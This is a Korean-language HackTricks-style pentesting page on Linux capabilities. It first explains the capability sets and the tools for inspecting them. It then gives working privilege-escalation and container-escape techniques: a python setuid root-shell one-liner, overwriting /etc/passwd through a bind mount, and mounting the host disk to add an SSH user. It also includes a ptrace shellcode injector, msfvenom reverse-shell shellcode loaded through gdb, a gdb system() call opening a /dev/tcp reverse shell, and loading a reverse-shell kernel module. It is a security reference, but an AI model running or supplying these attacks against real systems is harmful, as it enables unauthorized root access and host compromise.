# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilities는 **루트 권한을 더 작고 구별된 단위로 나누어**, 프로세스가 권한의 하위 집합을 가질 수 있도록 합니다. 이는 불필요하게 전체 루트 권한을 부여하지 않음으로써 위험을 최소화합니다.

### 문제:

- 일반 사용자는 제한된 권한을 가지며, 이는 루트 접근이 필요한 네트워크 소켓 열기와 같은 작업에 영향을 미칩니다.

### 권한 세트:

1. **상속된 (CapInh)**:

- **목적**: 부모 프로세스에서 전달된 권한을 결정합니다.
- **기능**: 새로운 프로세스가 생성될 때, 이 세트에서 부모로부터 권한을 상속받습니다. 프로세스 생성 간 특정 권한을 유지하는 데 유용합니다.
- **제한**: 프로세스는 부모가 가지지 않은 권한을 얻을 수 없습니다.

2. **유효 (CapEff)**:

- **목적**: 프로세스가 현재 사용하는 실제 권한을 나타냅니다.
- **기능**: 다양한 작업에 대한 권한을 부여하기 위해 커널이 확인하는 권한 세트입니다. 파일의 경우, 이 세트는 파일의 허용된 권한이 유효한지 여부를 나타내는 플래그가 될 수 있습니다.
- **의의**: 유효 세트는 즉각적인 권한 확인에 중요하며, 프로세스가 사용할 수 있는 활성 권한 세트로 작용합니다.

3. **허용된 (CapPrm)**:

- **목적**: 프로세스가 가질 수 있는 최대 권한 세트를 정의합니다.
- **기능**: 프로세스는 허용된 세트에서 유효 세트로 권한을 상승시킬 수 있으며, 이를 통해 해당 권한을 사용할 수 있습니다. 또한 허용된 세트에서 권한을 제거할 수도 있습니다.
- **경계**: 프로세스가 가질 수 있는 권한의 상한선 역할을 하여, 프로세스가 미리 정의된 권한 범위를 초과하지 않도록 보장합니다.

4. **경계 (CapBnd)**:

- **목적**: 프로세스가 생애 주기 동안 획득할 수 있는 권한에 한계를 둡니다.
- **기능**: 프로세스가 상속 가능하거나 허용된 세트에서 특정 권한을 가지고 있더라도, 경계 세트에 포함되지 않으면 해당 권한을 획득할 수 없습니다.
- **사용 사례**: 이 세트는 프로세스의 권한 상승 가능성을 제한하는 데 특히 유용하며, 추가적인 보안 계층을 추가합니다.

5. **환경 (CapAmb)**:
- **목적**: 특정 권한이 `execve` 시스템 호출을 통해 유지될 수 있도록 하며, 이는 일반적으로 프로세스의 권한이 완전히 초기화되는 결과를 초래합니다.
- **기능**: 관련 파일 권한이 없는 비-SUID 프로그램이 특정 권한을 유지할 수 있도록 보장합니다.
- **제한**: 이 세트의 권한은 상속 가능 및 허용된 세트의 제약을 받으며, 프로세스의 허용된 권한을 초과하지 않도록 보장합니다.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
더 많은 정보는 다음을 확인하세요:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## 프로세스 및 바이너리 권한

### 프로세스 권한

특정 프로세스의 권한을 보려면 /proc 디렉토리의 **status** 파일을 사용하세요. 더 많은 세부정보를 제공하므로 Linux 권한과 관련된 정보로만 제한합시다.\
모든 실행 중인 프로세스에 대한 권한 정보는 스레드별로 유지되며, 파일 시스템의 바이너리에 대해서는 확장 속성에 저장됩니다.

/usr/include/linux/capability.h에서 정의된 권한을 찾을 수 있습니다.

현재 프로세스의 권한은 `cat /proc/self/status` 또는 `capsh --print`를 사용하여 확인할 수 있으며, 다른 사용자의 권한은 `/proc/<pid>/status`에서 확인할 수 있습니다.
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
이 명령은 대부분의 시스템에서 5줄을 반환해야 합니다.

- CapInh = 상속된 권한
- CapPrm = 허용된 권한
- CapEff = 유효한 권한
- CapBnd = 경계 집합
- CapAmb = 환경 권한 집합
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
이 16진수 숫자는 의미가 없습니다. capsh 유틸리티를 사용하여 이를 권한 이름으로 디코딩할 수 있습니다.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
이제 `ping`에서 사용되는 **capabilities**를 확인해 봅시다:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
작동하긴 하지만, 더 쉽고 다른 방법이 있습니다. 실행 중인 프로세스의 능력을 보려면, **getpcaps** 도구를 사용한 다음 프로세스 ID (PID)를 입력하면 됩니다. 프로세스 ID 목록을 제공할 수도 있습니다.
```bash
getpcaps 1234
```
여기에서 `tcpdump`의 기능을 확인해 보겠습니다. 이진 파일에 충분한 기능(`cap_net_admin` 및 `cap_net_raw`)을 부여하여 네트워크를 스니핑합니다 (_tcpdump는 프로세스 9562에서 실행 중입니다_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
주어진 능력은 이진 파일의 능력을 얻는 두 가지 방법의 결과와 일치합니다.\
_getpcaps_ 도구는 **capget()** 시스템 호출을 사용하여 특정 스레드에 대한 사용 가능한 능력을 쿼리합니다. 이 시스템 호출은 더 많은 정보를 얻기 위해 PID만 제공하면 됩니다.

### 이진 파일의 능력

이진 파일은 실행 중에 사용할 수 있는 능력을 가질 수 있습니다. 예를 들어, `cap_net_raw` 능력을 가진 `ping` 이진 파일을 찾는 것은 매우 일반적입니다:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
바이너리를 **능력으로 검색**하려면 다음을 사용하세요:
```bash
getcap -r / 2>/dev/null
```
### Dropping capabilities with capsh

CAP*NET_RAW 기능을 \_ping*에서 제거하면 ping 유틸리티가 더 이상 작동하지 않아야 합니다.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
_capsh_의 출력 외에도 _tcpdump_ 명령 자체도 오류를 발생시켜야 합니다.

> /bin/bash: /usr/sbin/tcpdump: 허용되지 않는 작업

오류는 ping 명령이 ICMP 소켓을 열 수 없음을 명확히 보여줍니다. 이제 우리는 이것이 예상대로 작동한다는 것을 확실히 알게 되었습니다.

### 권한 제거

바이너리의 권한을 제거할 수 있습니다.
```bash
setcap -r </path/to/binary>
```
## 사용자 권한

명백히 **사용자에게도 권한을 부여할 수 있습니다**. 이는 아마도 사용자가 실행하는 모든 프로세스가 사용자의 권한을 사용할 수 있음을 의미합니다.\
[이것](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [이것](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) 및 [이것](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)을 기반으로 특정 권한을 사용자에게 부여하기 위해 몇 가지 파일을 구성해야 하지만, 각 사용자에게 권한을 부여하는 파일은 `/etc/security/capability.conf`입니다.\
파일 예:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Environment Capabilities

다음 프로그램을 컴파일하면 **권한을 제공하는 환경 내에서 bash 셸을 생성할 수 있습니다**.
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
컴파일된 환경 바이너리에 의해 실행된 **bash** 내부에서 **새로운 권한**을 관찰할 수 있습니다(일반 사용자는 "현재" 섹션에서 어떤 권한도 가지지 않습니다).
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> 당신은 **허용된 세트와 상속 가능한 세트 모두에 존재하는** 능력만 추가할 수 있습니다.

### 능력 인식/능력 무시 이진 파일

**능력 인식 이진 파일은** 환경에 의해 제공된 새로운 능력을 사용하지 않지만, **능력 무시 이진 파일은** 이를 거부하지 않기 때문에 사용할 것입니다. 이는 능력을 이진 파일에 부여하는 특별한 환경 내에서 능력 무시 이진 파일을 취약하게 만듭니다.

## 서비스 능력

기본적으로 **루트로 실행되는 서비스는 모든 능력이 할당됩니다**, 그리고 경우에 따라 이는 위험할 수 있습니다.\
따라서, **서비스 구성** 파일은 **원하는 능력**과 **서비스를 실행해야 하는 사용자**를 **지정**할 수 있게 하여 불필요한 권한으로 서비스를 실행하지 않도록 합니다:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker 컨테이너의 능력

기본적으로 Docker는 컨테이너에 몇 가지 능력을 할당합니다. 이러한 능력이 무엇인지 확인하는 것은 매우 쉽습니다:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities는 **특권 작업을 수행한 후 자신의 프로세스를 제한하고 싶을 때** 유용합니다 (예: chroot를 설정하고 소켓에 바인딩한 후). 그러나 악의적인 명령이나 인수를 전달하여 루트로 실행되도록 악용될 수 있습니다.

`setcap`을 사용하여 프로그램에 능력을 강제할 수 있으며, `getcap`을 사용하여 이를 조회할 수 있습니다:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep`는 능력을 추가하고 있음을 의미합니다 (“-”는 제거합니다) 유효하고 허용된 것으로.

시스템이나 폴더에서 능력을 가진 프로그램을 식별하려면:
```bash
getcap -r / 2>/dev/null
```
### Exploitation example

다음 예제에서 이진 파일 `/usr/bin/python2.6`가 권한 상승에 취약한 것으로 발견되었습니다:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
`tcpdump`가 **모든 사용자가 패킷을 스니핑할 수 있도록** 필요한 **Capabilities**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "빈" 권한의 특별한 경우

[문서에서](https://man7.org/linux/man-pages/man7/capabilities.7.html): 빈 권한 세트를 프로그램 파일에 할당할 수 있으며, 따라서 실행하는 프로세스의 유효 및 저장된 사용자 ID를 0으로 변경하지만 해당 프로세스에 권한을 부여하지 않는 set-user-ID-root 프로그램을 생성할 수 있습니다. 간단히 말해, 다음 조건을 만족하는 바이너리가 있다면:

1. root에 의해 소유되지 않음
2. `SUID`/`SGID` 비트가 설정되어 있지 않음
3. 빈 권한 세트가 설정되어 있음 (예: `getcap myelf`가 `myelf =ep`를 반환)

그렇다면 **해당 바이너리는 root로 실행됩니다**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**은 매우 강력한 Linux 권한으로, 장치 마운트 또는 커널 기능 조작과 같은 광범위한 **관리 권한**으로 인해 거의 root 수준에 해당합니다. 전체 시스템을 시뮬레이션하는 컨테이너에 필수적이지만, **`CAP_SYS_ADMIN`은 권한 상승 및 시스템 손상의 잠재력으로 인해** 특히 컨테이너화된 환경에서 상당한 보안 문제를 야기합니다. 따라서 이 권한의 사용은 엄격한 보안 평가와 신중한 관리가 필요하며, **최소 권한 원칙**을 준수하고 공격 표면을 최소화하기 위해 애플리케이션 전용 컨테이너에서 이 권한을 제거하는 것이 강력히 권장됩니다.

**바이너리 예제**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
파이썬을 사용하여 실제 _passwd_ 파일 위에 수정된 _passwd_ 파일을 마운트할 수 있습니다:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
마지막으로 수정된 `passwd` 파일을 `/etc/passwd`에 **마운트**합니다:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
그리고 당신은 비밀번호 "password"를 사용하여 **`su` as root**가 될 수 있습니다.

**환경 예시 (Docker 탈출)**

다음 명령어를 사용하여 도커 컨테이너 내에서 활성화된 권한을 확인할 수 있습니다:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
이전 출력에서 SYS_ADMIN 권한이 활성화되어 있음을 알 수 있습니다.

- **Mount**

이것은 도커 컨테이너가 **호스트 디스크를 마운트하고 자유롭게 접근할 수 있도록** 허용합니다:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **전체 접근**

이전 방법에서는 도커 호스트 디스크에 접근할 수 있었습니다.\
호스트가 **ssh** 서버를 실행 중인 경우, **도커 호스트** 디스크 내에 사용자를 생성하고 SSH를 통해 접근할 수 있습니다:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**이것은 호스트 내에서 실행 중인 프로세스에 쉘코드를 주입하여 컨테이너를 탈출할 수 있음을 의미합니다.** 호스트 내에서 실행 중인 프로세스에 접근하려면 컨테이너를 최소한 **`--pid=host`** 옵션으로 실행해야 합니다.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**는 `ptrace(2)`가 제공하는 디버깅 및 시스템 호출 추적 기능과 `process_vm_readv(2)` 및 `process_vm_writev(2)`와 같은 교차 메모리 연결 호출을 사용할 수 있는 능력을 부여합니다. 진단 및 모니터링 목적으로 강력하지만, `ptrace(2)`에 대한 seccomp 필터와 같은 제한 조치 없이 `CAP_SYS_PTRACE`가 활성화되면 시스템 보안을 심각하게 저해할 수 있습니다. 특히, 이는 seccomp에 의해 부과된 다른 보안 제한을 우회하는 데 악용될 수 있으며, [이와 같은 개념 증명(PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53)에서 입증되었습니다.

**바이너리 예제 (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**이진 파일 예제 (gdb)**

`gdb`와 `ptrace` 권한:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
msfvenom을 사용하여 메모리에 주입할 쉘코드를 생성합니다.
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
루트 프로세스를 gdb로 디버깅하고 이전에 생성된 gdb 라인을 복사하여 붙여넣습니다:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**환경 예제 (Docker 탈출) - 또 다른 gdb 남용**

**GDB**가 설치되어 있거나 (`apk add gdb` 또는 `apt install gdb`로 설치할 수 있는 경우) **호스트에서 프로세스를 디버깅**하고 `system` 함수를 호출하게 할 수 있습니다. (이 기술은 `SYS_ADMIN` 권한도 필요합니다)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
명령이 실행된 결과를 볼 수는 없지만 해당 프로세스에 의해 실행됩니다 (따라서 rev shell을 얻습니다).

> [!WARNING]
> "현재 컨텍스트에 'system' 기호가 없습니다."라는 오류가 발생하면 gdb를 통해 프로그램에 shellcode를 로드하는 이전 예제를 확인하십시오.

**환경 예제 (Docker 탈출) - Shellcode 주입**

docker 컨테이너 내에서 활성화된 기능을 확인하려면 다음을 사용하십시오:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
**프로세스** 나열하기 **호스트** `ps -eaf`

1. **아키텍처** 가져오기 `uname -m`
2. 아키텍처에 대한 **셸코드** 찾기 ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. 프로세스 메모리에 **셸코드**를 **주입**할 **프로그램** 찾기 ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. 프로그램 내의 **셸코드**를 **수정**하고 **컴파일**하기 `gcc inject.c -o inject`
5. **주입**하고 **셸**을 잡기: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**는 프로세스가 **커널 모듈을 로드하고 언로드할 수 있도록 (`init_module(2)`, `finit_module(2)` 및 `delete_module(2)` 시스템 호출)** 하여 커널의 핵심 작업에 직접 접근할 수 있게 합니다. 이 기능은 권한 상승 및 전체 시스템 손상을 가능하게 하여 커널을 수정할 수 있게 하므로 모든 Linux 보안 메커니즘, Linux Security Modules 및 컨테이너 격리를 우회하는 심각한 보안 위험을 초래합니다.  
**즉, 호스트 머신의 커널에 커널 모듈을 삽입/제거할 수 있습니다.**

**바이너리 예제**

다음 예제에서 바이너리 **`python`**은 이 기능을 가지고 있습니다.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
기본적으로 **`modprobe`** 명령은 **`/lib/modules/$(uname -r)`** 디렉토리에서 의존성 목록과 맵 파일을 확인합니다.\
이를 악용하기 위해 가짜 **lib/modules** 폴더를 생성해 보겠습니다:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
그런 다음 **커널 모듈을 컴파일하고 아래 두 가지 예를 찾아서** 이 폴더에 복사하세요:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
마지막으로, 이 커널 모듈을 로드하기 위해 필요한 파이썬 코드를 실행하세요:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**예제 2: 바이너리와 함께**

다음 예제에서 바이너리 **`kmod`**는 이 권한을 가지고 있습니다.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
